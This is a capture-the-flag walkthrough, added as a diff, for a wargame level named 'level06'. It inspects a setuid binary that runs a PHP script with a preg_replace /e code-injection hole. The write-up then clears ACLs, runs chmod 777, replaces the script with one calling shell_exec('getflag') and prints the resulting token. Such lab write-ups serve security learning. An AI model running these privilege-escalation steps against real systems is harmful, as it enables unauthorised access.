@@ -1,0 +1,91 @@
+~$ ll
+total 24
+dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
+d--x--x--x  1 root    users    340 Aug 30  2015 ../
+-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
+-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc*
+-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
+-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
+-r-x------  1 level06 level06  675 Apr  3  2012 .profile*
+
+Here we have two things. One binary "level06" and one .php file "level06.php"
+
+Let's see what's inside the level06 binary using the "strings" command:
+
+~$ strings level06
+...
+/usr/bin/php
+/home/user/level06/level06.php
+...
+
+Two interesting lines here, its seems that the program is executing level06.php.
+Let's execute level06.
+
+~$ ./level06
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+So this php scripts that is executed trought level06 binary needs a file as argument.
+We gonna need to know that does the level06.php script exactly does to exploit it
+
+~$ cat /home/user/level06/level06.php
+```
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+```
+
+function y($m) { ... }:
+This function takes a string as input and replaces all periods (.)
+with the string "x" and all at symbols (@) with the string " y".
+It then returns the modified string.
+
+function x($y, $z) { ... }:
+This function takes two parameters: $y (a filename) and $z (unused in the function).
+It reads the contents of the file into the variable $a using the file_get_contents() function.
+It then uses a regexp to find any strings in square brackets that start with "x" followed by a space,
+and passes the substring inside the brackets to the y() function to modify it.
+The modified substring is then put back into the original string with the square brackets
+replaced with parentheses. The function returns the modified string.
+
+$r = x($argv[1], $argv[2]);:
+This line calls the x() function, passing in the first
+two command line arguments as parameters.
+
+print $r;: This line prints out the modified contents of the file to the console.
+
+Actually this script does nothing but some strings manipulation.
+Let's replace the script with our own php script.
+
+
+~$ setfacl -b .
+This command removes all extended ACL entries from the current directory.
+The -b option in the setfacl command stands for "remove all extended ACL entries."
+This can be useful if you want to reset the permissions on a directory and start fresh.
+
+~$ chmod 777 .
+Gains all rights on the ~/ directory.
+
+- Remove the current level06.php script
+
+~$ rm level06.php
+rm: remove write-protected regular file `level06.php'? y
+
+- Create the new level06.php script
+
+~$ touch level06.php
+~$ vim level06.php
+```
+<?php
+$output = shell_exec('getflag');
+
+echo "$output";
+?>
+```
+
+- Now  execute the level06 binary
+
+~$ ./level06
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
